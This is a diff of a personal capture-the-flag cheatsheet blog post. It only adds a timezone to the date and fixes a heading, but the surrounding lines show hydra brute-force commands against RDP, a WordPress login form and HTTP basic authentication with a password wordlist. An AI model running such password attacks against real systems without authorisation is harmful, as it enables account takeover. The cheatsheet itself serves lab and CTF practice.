@@ -2,7 +2,7 @@
 title: CTF Cheatsheet
 description: A handy cheatsheet for CTF so I won't have to lose my mind finding correct syntax.
 author: Bsar
-date: 2024-10-14 00:00:00
+date: 2024-10-14 00:00:00 -03:00
 categories: [Cheatsheet]
 tags: [Cheatsheet]
 pin: true
@@ -301,7 +301,7 @@ python3 -m pyftpdlib -p 21 --write
 | hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip> | Attack a Windows Remote Desktop with a password list. |
 | hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Craft a more specific request for Hydra to brute force. |
 
-## Bruteforce HTTP basic Authenticate
+## Bruteforce HTTP basic Authentication
 `hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-get /{path of directory}`
 \
 `-l` username
